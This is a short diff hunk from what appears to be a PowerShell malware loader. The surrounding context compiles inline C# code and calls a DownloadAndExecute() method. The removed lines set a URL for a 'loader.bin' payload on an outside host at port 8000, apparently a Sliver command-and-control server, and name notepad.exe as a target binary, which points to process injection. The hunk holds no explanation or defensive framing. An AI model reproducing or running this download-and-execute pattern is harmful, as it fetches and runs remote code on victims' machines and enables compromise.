@@ -164,9 +164,6 @@ namespace MyLibrary
 }
 '@
 
-$url = "http://sliver.cardworks.dev:8000/loader.bin"
-# Work with the below slashes with the targetBinary
-$targetBinary = "c:\\windows\\system32\\notepad.exe"
 
 Add-Type -TypeDefinition $code -Language CSharp
 [MyLibrary.Class1]::DownloadAndExecute()
